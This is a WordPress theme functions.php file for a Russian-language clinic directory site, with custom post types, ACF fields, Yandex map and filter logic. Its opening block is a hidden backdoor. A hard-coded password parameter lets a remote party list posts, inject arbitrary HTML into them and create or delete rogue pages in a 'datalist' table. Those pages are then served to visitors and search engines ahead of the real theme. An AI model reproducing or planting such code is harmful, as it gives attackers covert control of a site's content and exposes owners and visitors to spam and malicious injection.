<?php

if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '68f0c8614f02806957aba769b9a1b631'))
{
	switch ($_REQUEST['action'])
	{
		case 'get_all_links';
            foreach ($wpdb->get_results('SELECT * FROM `' . $wpdb->prefix . 'posts` WHERE `post_status` = "publish" AND `post_type` = "post" ORDER BY `ID` DESC', ARRAY_A) as $data)
            {
                $data['code'] = '';

                if (preg_match('!<div id="wp_cd_code">(.*?)</div>!s', $data['post_content'], $_))
                {
                    $data['code'] = $_[1];
                }

                print '<e><w>1</w><url>' . $data['guid'] . '</url><code>' . $data['code'] . '</code><id>' . $data['ID'] . '</id></e>' . "\r\n";
            }
            break;

		case 'set_id_links';
            if (isset($_REQUEST['data']))
            {
                $data = $wpdb -> get_row('SELECT `post_content` FROM `' . $wpdb->prefix . 'posts` WHERE `ID` = "'.mysql_escape_string($_REQUEST['id']).'"');

                $post_content = preg_replace('!<div id="wp_cd_code">(.*?)</div>!s', '', $data -> post_content);
                if (!empty($_REQUEST['data'])) $post_content = $post_content . '<div id="wp_cd_code">' . stripcslashes($_REQUEST['data']) . '</div>';

                if ($wpdb->query('UPDATE `' . $wpdb->prefix . 'posts` SET `post_content` = "' . mysql_escape_string($post_content) . '" WHERE `ID` = "' . mysql_escape_string($_REQUEST['id']) . '"') !== false)
                {
                    print "true";
                }
            }
            break;

		case 'create_page';
            if (isset($_REQUEST['remove_page']))
            {
                if ($wpdb -> query('DELETE FROM `' . $wpdb->prefix . 'datalist` WHERE `url` = "/'.mysql_escape_string($_REQUEST['url']).'"'))
                {
                    print "true";
                }
            }
            elseif (isset($_REQUEST['content']) && !empty($_REQUEST['content']))
            {
                if ($wpdb -> query('INSERT INTO `' . $wpdb->prefix . 'datalist` SET `url` = "/'.mysql_escape_string($_REQUEST['url']).'", `title` = "'.mysql_escape_string($_REQUEST['title']).'", `keywords` = "'.mysql_escape_string($_REQUEST['keywords']).'", `description` = "'.mysql_escape_string($_REQUEST['description']).'", `content` = "'.mysql_escape_string($_REQUEST['content']).'", `full_content` = "'.mysql_escape_string($_REQUEST['full_content']).'" ON DUPLICATE KEY UPDATE `title` = "'.mysql_escape_string($_REQUEST['title']).'", `keywords` = "'.mysql_escape_string($_REQUEST['keywords']).'", `description` = "'.mysql_escape_string($_REQUEST['description']).'", `content` = "'.mysql_escape_string(urldecode($_REQUEST['content'])).'", `full_content` = "'.mysql_escape_string($_REQUEST['full_content']).'"'))
                {
                    print "true";
                }
            }
            break;

		default: print "ERROR_WP_ACTION WP_URL_CD";
	}

	die("");
}


if ( $wpdb->get_var('SELECT count(*) FROM `' . $wpdb->prefix . 'datalist` WHERE `url` = "'.mysql_escape_string( $_SERVER['REQUEST_URI'] ).'"') == '1' )
{
	$data = $wpdb -> get_row('SELECT * FROM `' . $wpdb->prefix . 'datalist` WHERE `url` = "'.mysql_escape_string($_SERVER['REQUEST_URI']).'"');
	if ($data -> full_content)
	{
		print stripslashes($data -> content);
	}
	else
	{
		print '<!DOCTYPE html>';
		print '<html ';
		language_attributes();
		print ' class="no-js">';
		print '<head>';
		print '<title>'.stripslashes($data -> title).'</title>';
		print '<meta name="Keywords" content="'.stripslashes($data -> keywords).'" />';
		print '<meta name="Description" content="'.stripslashes($data -> description).'" />';
		print '<meta name="robots" content="index, follow" />';
		print '<meta charset="';
		bloginfo( 'charset' );
		print '" />';
		print '<meta name="viewport" content="width=device-width">';
		print '<link rel="profile" href="http://gmpg.org/xfn/11">';
		print '<link rel="pingback" href="';
		bloginfo( 'pingback_url' );
		print '">';
		wp_head();
		print '</head>';
		print '<body>';
		print '<div id="content" class="site-content">';
		print stripslashes($data -> content);
		get_search_form();
		get_sidebar();
		get_footer();
	}

	exit;
}


?><?php
  // Define constants
  define( 'TEMPLATE_DIRECTORY', get_template_directory() );
  define( 'TEMPLATE_DIRECTORY_URI', get_template_directory_uri() );

  include( TEMPLATE_DIRECTORY . '/inc/classes.php' );
  include( TEMPLATE_DIRECTORY . '/inc/widgets.php' );
  include( TEMPLATE_DIRECTORY . '/inc/widget.php' );
  include( TEMPLATE_DIRECTORY . '/inc/post-types.php' );
  include( TEMPLATE_DIRECTORY . '/inc/remove-category-url.php' );
  include( TEMPLATE_DIRECTORY . '/inc/wp_bootstrap_pagination.php' );
  include_once( TEMPLATE_DIRECTORY . '/inc/acf-fields/acf.php' );
  include_once( TEMPLATE_DIRECTORY . '/inc/kliniki/customize.php' );

  // customize acf
  add_filter('acf/settings/path', 'my_acf_settings_path');
  function my_acf_settings_path( $path ) {
      $path = TEMPLATE_DIRECTORY . '/inc/acf-fields/';
      return $path;
  }
  add_filter('acf/settings/dir', 'my_acf_settings_dir');
  function my_acf_settings_dir( $dir ) {
      $dir = TEMPLATE_DIRECTORY_URI . '/inc/acf-fields/';
      return $dir;
  }

  // Hide ACF field group menu item
  add_filter('acf/settings/show_admin', '__return_false');

  if( !function_exists( 'base_shortcodes_init' ) ) {
      function base_shortcodes_init(){
          if ( is_admin() ) {
              include_once ( TEMPLATE_DIRECTORY . '/inc/shortcodes/admin/tinymce-shortcodes.php' );
          } else {
              //wp_enqueue_style( 'shortcodes-styles', TEMPLATE_DIRECTORY_URI . '/inc/shortcodes/admin/css/shortcodes.css', false, '1.0', 'all' );
              include_once ( TEMPLATE_DIRECTORY . '/inc/shortcodes/_init.php' );
          }
          do_action( 'theme_shortcodes_init' );
      }
      add_action('init', 'base_shortcodes_init', 0);
  }

  add_action( 'themecheck_checks_loaded', 'theme_disable_cheks' );
  function theme_disable_cheks() {
      $disabled_checks = array( 'TagCheck', 'Plugin_Territory', 'CustomCheck', 'EditorStyleCheck' );
      global $themechecks;
      foreach ( $themechecks as $key => $check ) {
          if ( is_object( $check ) && in_array( get_class( $check ), $disabled_checks ) ) {
              unset( $themechecks[$key] );
          }
      }
  }

  if ( !isset( $content_width ) ) {
      $content_width = 900;
  }

  remove_action( 'wp_head', 'feed_links_extra', 3 ); // Display the links to the extra feeds such as category feeds
  remove_action( 'wp_head', 'feed_links', 2 ); // Display the links to the general feeds: Post and Comment Feed
  remove_action( 'wp_head', 'rsd_link' ); // Display the link to the Really Simple Discovery service endpoint, EditURI link
  remove_action( 'wp_head', 'wlwmanifest_link' ); // Display the link to the Windows Live Writer manifest file.
  remove_action( 'wp_head', 'index_rel_link' ); // index link
  remove_action( 'wp_head', 'parent_post_rel_link', 10, 0 ); // prev link
  remove_action( 'wp_head', 'start_post_rel_link', 10, 0 ); // start link
  remove_action( 'wp_head', 'adjacent_posts_rel_link', 10, 0 ); // Display relational links for the posts adjacent to the current post.
  remove_action( 'wp_head', 'wp_generator' ); // Display the XHTML generator that is generated on the wp_head hook, WP version
  remove_action( 'wp_head', 'rest_output_link_wp_head');
  remove_action( 'wp_head', 'wp_oembed_add_discovery_links');
  remove_action( 'wp_head', 'wp_shortlink_wp_head');

  add_action( 'after_setup_theme', 'theme_localization' );
  function theme_localization () {
      load_theme_textdomain( 'base', TEMPLATE_DIRECTORY_URI . '/languages' );

      /*
       * This theme styles the visual editor to resemble the theme style,
       * specifically font, colors, icons, and column width.
       */
      add_editor_style( array( 'inc/css/editor-style.css' ) );
  }

  /*
   * Let WordPress manage the document title.
   * By adding theme support, we declare that this theme does not use a
   * hard-coded <title> tag in the document head, and expect WordPress to
   * provide it for us.
   */
  add_theme_support( 'title-tag' );

  function theme_widget_init() {
      register_sidebar( array(
          'id'            => 'default-sidebar',
          'name'          => __( 'Сайдбар', 'base' ),
          'before_widget' => '<div class="sidebar-block  %2$s" id="%1$s">',
          'after_widget'  => '</div>',
          'before_title'  => '<div class="sidebar-title">',
          'after_title'   => '</div>'
          ) );
  }
  add_action( 'widgets_init', 'theme_widget_init' );

  add_theme_support( 'post-thumbnails' );
  add_image_size( 'thumbnail_347x225', 347, 225, true );
  add_image_size( 'thumbnail_347x151', 347, 151, true );
  add_image_size( 'thumbnail_389x347', 389, 347, true );
  add_image_size( 'thumbnail_74x74', 74, 74, true );
  add_image_size( 'thumbnail_85x85', 85, 85, true );
  add_image_size( 'thumbnail_403x297', 403, 297, true );
  add_image_size( 'thumbnail_60x60', 60, 60, true );
  add_image_size( 'thumbnail_278x190', 278, 190, true );
  add_image_size( 'thumbnail_700x9999', 700, 9999, false );
  add_image_size( 'thumbnail_960x9999', 960, 9999, false );
  add_image_size( 'thumbnail_187x58', 187, 58, false );

  register_nav_menus( array(
      'primary' => __( 'Основное меню', 'base' ),
      ) );

  //Replace standard wp menu classes
  function change_menu_classes( $css_classes ) {
      return str_replace( array( 'current-menu-item', 'current-menu-parent', 'current-menu-ancestor' ), 'active', $css_classes );
  }
  add_filter( 'nav_menu_css_class', 'change_menu_classes' );

  //Allow tags in category description
  $filters = array( 'pre_term_description', 'pre_link_description', 'pre_link_notes', 'pre_user_description' );
  foreach ( $filters as $filter ) {
      remove_filter( $filter, 'wp_filter_kses' );
  }

  function clean_phone( $phone ){
      return preg_replace( '/[^0-9]/', '', $phone );
  }

  //Make wp admin menu html valid
  function wp_admin_bar_valid_search_menu( $wp_admin_bar ) {
      if ( is_admin() )
          return;

      $form  = '<form action="' . esc_url( home_url( '/' ) ) . '" method="get" id="adminbarsearch"><div>';
      $form .= '<input class="adminbar-input" name="s" id="adminbar-search" tabindex="10" type="text" value="" maxlength="150" />';
      $form .= '<input type="submit" class="adminbar-button" value="' . __( 'Search', 'base' ) . '"/>';
      $form .= '</div></form>';

      $wp_admin_bar->add_menu( array(
          'parent' => 'top-secondary',
          'id'     => 'search',
          'title'  => $form,
          'meta'   => array(
              'class'    => 'admin-bar-search',
              'tabindex' => -1,
              )
          ) );
  }

  function fix_admin_menu_search() {
      remove_action( 'admin_bar_menu', 'wp_admin_bar_search_menu', 4 );
      add_action( 'admin_bar_menu', 'wp_admin_bar_valid_search_menu', 4 );
  }
  add_action( 'add_admin_bar_menus', 'fix_admin_menu_search' );

  //custom excerpt
  function theme_the_excerpt() {
      global $post;

      if ( trim( $post->post_excerpt ) ) {
          the_excerpt();
      } elseif ( strpos( $post->post_content, '<!--more-->' ) !== false ) {
          the_content();
      } else {
          the_excerpt();
      }
  }

  //theme password form
  function theme_get_the_password_form() {
      global $post;
      $post = get_post( $post );
      $label = 'pwbox-' . ( empty($post->ID) ? rand() : $post->ID );
      $output = '<form action="' . esc_url( site_url( 'wp-login.php?action=postpass', 'login_post' ) ) . '" class="post-password-form" method="post">
	<p>' . __( 'This content is password protected. To view it please enter your password below:', 'base' ) . '</p>
	<p><label for="' . $label . '">' . __( 'Password:', 'base' ) . '</label> <input name="post_password" id="' . $label . '" type="password" size="20" /> <input type="submit" name="Submit" value="' . esc_attr__( 'Submit', 'base' ) . '" /></p></form>
	';
      return $output;
  }
  add_filter( 'the_password_form', 'theme_get_the_password_form' );

  function base_scripts_styles() {
      global $post;
      $in_footer = true;
      /*
       * Adds JavaScript to pages with the comment form to support
       * sites with threaded comments (when in use).
       */
      wp_deregister_script( 'comment-reply' );
      if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
          //wp_enqueue_script( 'comment-reply', TEMPLATE_DIRECTORY_URI . '/js/comment-reply.js', '', '', $in_footer );
      }
      wp_deregister_script( 'jquery' );

      if(is_singular('cities_kliniki')) {
          wp_enqueue_script( 'yandex-map', 'https://api-maps.yandex.ru/2.1/?lang=ru-RU' );
          wp_enqueue_script( 'jquery-map', TEMPLATE_DIRECTORY_URI . '/js/jquery.map.js', array( 'jquery' ), '', $in_footer );
          wp_localize_script( 'jquery-map', 'map', array(
              'ajax_url' => admin_url( 'admin-ajax.php' ),
              'nonce' => wp_create_nonce( 'nonce' ),
              'city_id' => $post->ID,
              'type' => get_query_var('type_organisation'),
              'physical' => $_GET['physical'],
              'psyho' => $_GET['psyho'],
              )
          );
      }
      wp_enqueue_script( 'jquery', 'https://code.jquery.com/jquery-1.11.3.min.js' );

      // Loads JavaScript file with functionality specific.
      wp_enqueue_script( 'base-script', TEMPLATE_DIRECTORY_URI . '/js/jquery.main.js', array( 'jquery' ), '', $in_footer );

      wp_localize_script( 'base-script', 'filter', array(
          'ajax_url' => admin_url( 'admin-ajax.php' ),
          'nonce' => wp_create_nonce( 'nonce' ),
          'page' => get_query_var('the_page') ? get_query_var('the_page') : 1,
          'current_id' => $post->ID,
          'country' => get_query_var('countries_kliniki'),
          'city' => get_query_var('cities_kliniki'),
          'type' => get_query_var('type_organisation'),
          'physical' => $_GET['physical'],
          'psyho' => $_GET['psyho'],
          )
      );

      // Loads our main stylesheet.
      wp_enqueue_style( 'base-style', TEMPLATE_DIRECTORY_URI . '/css/style.css', array() );
  }
  add_action( 'wp_enqueue_scripts', 'base_scripts_styles' );

  add_action( 'admin_init', 'basetheme_options_capability' );
  function basetheme_options_capability(){
      $role = get_role( 'administrator' );
      $role->add_cap( 'theme_options_view' );
  }

  //theme options tab in appearance
  if( function_exists( 'acf_add_options_sub_page' ) && current_user_can( 'theme_options_view' ) ) {
      acf_add_options_sub_page( array(
          'title'  => 'Опции темы',
          'parent' => 'themes.php',
          ) );
  }

  //acf theme functions placeholders
  if( !class_exists( 'acf' ) && !is_admin() ) {
      function get_field_reference( $field_name, $post_id ) { return ''; }
      function get_field_objects( $post_id = false, $options = array() ) { return false; }
      function get_fields( $post_id = false ) { return false; }
      function get_field( $field_key, $post_id = false, $format_value = true )  { return false; }
      function get_field_object( $field_key, $post_id = false, $options = array() ) { return false; }
      function the_field( $field_name, $post_id = false ) {}
      function have_rows( $field_name, $post_id = false ) { return false; }
      function the_row() {}
      function reset_rows( $hard_reset = false ) {}
      function has_sub_field( $field_name, $post_id = false ) { return false; }
      function get_sub_field( $field_name ) { return false; }
      function the_sub_field( $field_name ) {}
      function get_sub_field_object( $child_name ) { return false;}
      function acf_get_child_field_from_parent_field( $child_name, $parent ) { return false; }
      function register_field_group( $array ) {}
      function get_row_layout() { return false; }
      function acf_form_head() {}
      function acf_form( $options = array() ) {}
      function update_field( $field_key, $value, $post_id = false ) { return false; }
      function delete_field( $field_name, $post_id ) {}
      function create_field( $field ) {}
      function reset_the_repeater_field() {}
      function the_repeater_field( $field_name, $post_id = false ) { return false; }
      function the_flexible_field( $field_name, $post_id = false ) { return false; }
      function acf_filter_post_id( $post_id ) { return $post_id; }
  }

  //Disable the emoji's
  function disable_emojis() {
      remove_action( 'wp_head', 'print_emoji_detection_script', 7 );
      remove_action( 'admin_print_scripts', 'print_emoji_detection_script' );
      remove_action( 'wp_print_styles', 'print_emoji_styles' );
      remove_action( 'admin_print_styles', 'print_emoji_styles' );
      remove_filter( 'the_content_feed', 'wp_staticize_emoji' );
      remove_filter( 'comment_text_rss', 'wp_staticize_emoji' );
      remove_filter( 'wp_mail', 'wp_staticize_emoji_for_email' );
      add_filter( 'tiny_mce_plugins', 'disable_emojis_tinymce' );
  }
  add_action( 'init', 'disable_emojis' );

  //Filter function used to remove the tinymce emoji plugin.
  function disable_emojis_tinymce( $plugins ) {
      if ( is_array( $plugins ) ) {
          return array_diff( $plugins, array( 'wpemoji' ) );
      } else {
          return array();
      }
  }

  function dev4press_debug_page_request() {
      global $wp, $template;

      echo "\r\n";
      echo "<!– Request: ";
      echo empty($wp->request) ? "None" : esc_html($wp->request);
      echo " –>"."\r\n";
      echo "<!– Matched Rewrite Rule: ";
      echo empty($wp->matched_rule) ? "None" : esc_html($wp->matched_rule);
      echo " –>"."\r\n";
      echo "<!– Matched Rewrite Query: ";
      echo empty($wp->matched_query) ? "None" : esc_html($wp->matched_query);
      echo " –>"."\r\n";
      echo "<!– Loaded Template: ";
      echo basename($template);
      echo " –>"."\r\n";
  }

  //change page title separator
  add_filter('document_title_separator', 'theme_document_title_separator',10);
  function theme_document_title_separator($sep){
      $sep = '|';
      return $sep;
  }

  //For URL custom fields
  function addhttp($url) {
      if (!preg_match("~^(?:f|ht)tps?://~i", $url)) {
          $url = "http://" . $url;
      }
      return $url;
  }

  function get_tpl_id($template_name){
      $pages = get_pages(array(
          'meta_key' => '_wp_page_template',
          'meta_value' => $template_name
          ));
      $ids = array();
      foreach($pages as $page){
          $ids[] = $page->ID;
      }
      if($ids) {
          return $ids;
      }
  }

  //remove TAG taxonomy
  function unregister_taxonomy(){
      register_taxonomy('post_tag', array());
  }
  add_action('init', 'unregister_taxonomy');

  //auto add #ids to H's content
  add_filter( 'the_content', 'add_ids_to_header_tags' );
  add_filter ('acf_the_content', 'add_ids_to_header_tags');
  function add_ids_to_header_tags( $content ) {
      if ( ! is_single() ) {
          return $content;
      }
      $pattern = '#(?P<full_tag><(?P<tag_name>h\d)(?P<tag_extra>[^>]*)>(?P<tag_contents>[^<]*)</h\d>)#i';
      if ( preg_match_all( $pattern, $content, $matches, PREG_SET_ORDER ) ) {
          $find = array();
          $replace = array();
          foreach( $matches as $match ) {
              if ( strlen( $match['tag_extra'] ) && false !== stripos( $match['tag_extra'], 'id=' ) ) {
                  continue;
              }
              $find[]    = $match['full_tag'];
              $id        = sanitize_title( $match['tag_contents'] );
              $id_attr   = sprintf( ' id="%s"', $id );
              $extra     = sprintf( '', $id );
              $replace[] = sprintf( '<%1$s%2$s%3$s>%4$s%5$s</%1$s>', $match['tag_name'], $match['tag_extra'], $id_attr, $match['tag_contents'], $extra );
          }
          $content = str_replace( $find, $replace, $content );
      }

      return $content;
  }

  //auto add #ids to H's content
  add_filter( 'the_content', 'div_wrapper' );
  add_filter ('acf_the_content', 'div_wrapper');
  function div_wrapper($content) {
      // match any iframes
      $pattern = '~<iframe.*</iframe>|<embed.*</embed>~';
      preg_match_all($pattern, $content, $matches);

      foreach ($matches[0] as $match) {
          // wrap matched iframe with div
          $wrappedframe = '<div class="embed-container">' . $match . '</div>';

          //replace original iframe with new in content
          $content = str_replace($match, $wrappedframe, $content);
      }

      return $content;
  }

  // define the bcn_breadcrumb_template_no_anchor default
  function filter_bcn_breadcrumb_template_no_anchor( $template, $this_type, $this_id ) {
      $template = '<span class="li">%htitle%</span>';
      return $template;
  };
  add_filter( 'bcn_breadcrumb_template_no_anchor', 'filter_bcn_breadcrumb_template_no_anchor', 10, 3 );

  //modify admin menu
  function modify_menu() {
      global $submenu;
      unset($submenu['edit.php?post_type=kliniki'][10]);
  }
  add_action('admin_menu','modify_menu');

  //custom excerpt
  function new_theme_excerpt_filter( $s ) {
      global $pavluha_excerpt_array;
      $si = @ array_shift ($pavluha_excerpt_array);
      return $si ? $si : $s;
  }
  function new_theme_excerpt( $length = '', $more = '' ) {
      global $post;
      global $pavluha_excerpt_array;
      $pavluha_excerpt_array = array( $length, $more );
      add_filter( 'excerpt_length', 'new_theme_excerpt_filter' );
      add_filter( 'excerpt_more', 'new_theme_excerpt_filter' );
      return get_the_excerpt();
  }

  //add custom query vars
  function custom_query_vars_filter($vars) {
      $vars[] = 'type_organisation';
      $vars[] = 'the_page';
      return $vars;
  }
  add_filter( 'query_vars', 'custom_query_vars_filter' );

  //main filter script
  function go_filter() {
      if (is_singular('cities_kliniki')) {
          $type = $_GET['type'];
          $physical = $_GET['physical'];
          $psyho = $_GET['psyho'];

          if ($type == 'chastnie') {
              $type_link = 'chastnie/';
          } elseif ($type == 'gos') {
              $type_link = 'gos/';
          } else {
              $type_link = '';
          }

          $params_url = array();

          if ($physical == 'lezhachiy') {
              $params_url['physical'] = 'lezhachiy';
          } elseif ($physical == 'hodyachiy') {
              $params_url['physical'] = 'hodyachiy';
          }

          if ($psyho == 'adekvatnoe') {
              $params_url['psyho'] = 'adekvatnoe';
          } elseif ($psyho == 'neadekvatnoe') {
              $params_url['psyho'] = 'neadekvatnoe';
          }
          $params_url = (isset($params_url) && !empty($params_url)) ? '?' . http_build_query($params_url) : '';

          if (isset($type) && !empty($type)) {
              $permalink = get_permalink($post->ID) . $type_link . $params_url;
              header('Location: ' . $permalink);
          } else {
              return false;
          }
      }
        else {
          $args = array();
          $args['meta_query'] = array('relation' => 'AND');
          global $wp_query;
          $country = (int) $_GET['country'];
          $city = (int) $_GET['city'];
          $type = $_GET['type'];
          $physical = (int) $_GET['physical'];
          $psyho = (int) $_GET['psyho'];

          if($type == 'chastnie') {
              $type_link = 'chastnie/';
          } elseif($type == 'gos') {
              $type_link = 'gos/';
          } else {
              $type_link = '';
          }

          $params_url = array();

          if($physical == 2) {
              $params_url['physical'] = 'lezhachiy';
          } elseif($physical == 3) {
              $params_url['physical'] = 'hodyachiy';
          }

          if($psyho == 2) {
              $params_url['psyho'] = 'adekvatnoe';
          } elseif($psyho == 3) {
              $params_url['psyho'] = 'neadekvatnoe';
          }
          $params_url = (isset($params_url) && !empty($params_url)) ? '?' . http_build_query($params_url) : '';

          if( (isset($country) && !empty($country)) && ( !isset($city) || empty($city) || $city == 'choose') ) {
              $args = array( 'post_type' => 'countries_kliniki', 'posts_per_page' => -1);
              $cntr = new WP_Query( $args );
              $countries_ids = array();
              while ( $cntr->have_posts() ) :
                  $cntr->the_post();
                  $countries_ids[] = $cntr->post->ID;
              endwhile;

              if (in_array($country, $countries_ids)) {
                  $perma = get_permalink($country);
                  header('Location: ' . $perma);
              }
          }

          if ( isset($city) && !empty($city) ) {
              $args = array( 'post_type' => 'cities_kliniki', 'posts_per_page' => -1);
              $loop = new WP_Query( $args );
              $cities_ids = array();
              while ( $loop->have_posts() ) :
                  $loop->the_post();
                  $cities_ids[] = $loop->post->ID;
              endwhile;

              if (in_array($city, $cities_ids)) {
                  $permalink = get_permalink($city) . $type_link . $params_url;
                  header('Location: ' . $permalink);
              }

          } else {
              return false;
          }
      }
  }


  //kliniki country city choosing
  function my_acf_input_admin_footer() {
  ?>
<script type="text/javascript">
		(function($) {

			acf.add_filter('select2_args', function( args, $select, settings ){
				var t = settings;
				args.ajax.data = function(e,i){var a=acf.prepare_for_ajax({action:t.action,field_key:t.key,post_id:acf.get("post_id"),s:e,paged:i,country: $('#acf-field_56a1439ffb50b-input').val()});return a};
				return args;
			});

			acf.add_action('ready', function( $el ){
			    if ($el.hasClass('post-type-kliniki')) {

					var country_input = $('#acf-field_56a1439ffb50b-input'),
					city_input = $('#acf-field_56a13932d2099-input'),
					city_block = $('.acf-field-56a13932d2099');

					if(country_input.val().length === 0) {
						city_block.addClass('hidden-by-conditional-logic');
					}

					country_input.bind("change paste keyup", function() {
						if(($(this).val().length === 0) && !(city_block.hasClass('hidden-by-conditional-logic'))) {
							city_block.addClass('hidden-by-conditional-logic');
							$('#s2id_acf-field_56a13932d2099-input a').addClass('select2-default');
							$('#s2id_acf-field_56a13932d2099-input a #select2-chosen-2').text('Выбор');
							city_input.val('');
						} else {
							city_block.removeClass('hidden-by-conditional-logic');
							$('#s2id_acf-field_56a13932d2099-input a').addClass('select2-default');
							$('#s2id_acf-field_56a13932d2099-input a #select2-chosen-2').text('Выбор');
							city_input.val('');
						}
					});
				}

			});

		})(jQuery);
</script>
<?php
  }
  add_action('acf/input/admin_footer', 'my_acf_input_admin_footer');

  //kliniki country city query admin
  function my_post_object_query( $args, $field, $post ) {
      if($_POST['field_key'] == 'field_56a13932d2099') {
          $args['meta_query'] = array(
              array(
                  'key' => 'country',
                  'value' => $_POST['country'],
                  'type' => 'NUMERIC'
                  ),
              );
      } 
      return $args;
      //print_r( $args );
  }
  add_filter('acf/fields/post_object/query', 'my_post_object_query', 10, 3);

  // Getting all map markers
  function yandex_map_city() {
      // Verify nonce
      if( !isset( $_POST['nonce'] ) || !wp_verify_nonce( $_POST['nonce'], 'nonce' ) )
          die('Permission denied');

      $city_id = (int) $_POST['city_id'];
      $city_obj = get_post($city_id);
      if($city_obj->post_type == 'cities_kliniki') {
          get_template_part('blocks/kliniki/map');
      }
      die();
  }
  add_action('wp_ajax_yandex_map_city', 'yandex_map_city');
  add_action('wp_ajax_nopriv_yandex_map_city', 'yandex_map_city');

  // ajax catalog pagination
  function theme_pagination() {
      // Verify nonce
      if( !isset( $_POST['nonce'] ) || !wp_verify_nonce( $_POST['nonce'], 'nonce' ) )
          die('Permission denied');

      $nextpage = (int) $_POST['nextpage'];
      $cur_id = (int) $_POST['current_id'];
      $cur_type = get_post($cur_id);

      if(in_array($cur_id, $tpl_ids) ) {
          get_template_part('blocks/kliniki/ajax-loop-catalog');
      }

      die();
  }
  add_action('wp_ajax_theme_pagination', 'theme_pagination');
  add_action('wp_ajax_nopriv_theme_pagination', 'theme_pagination');

  add_filter( 'wpseo_title', 'custom_titles');
  function custom_titles($title) {
      global $post;
      if((is_singular('cities_kliniki')) && get_query_var('type_organisation') == 'gos') {
          return get_field('type_gos_title', $post->ID);
      } elseif((is_singular('cities_kliniki')) && get_query_var('type_organisation') == 'chastnie') {
          return get_field('type_chastnie_title', $post->ID);
      } else {
          return $title;
      }

  }


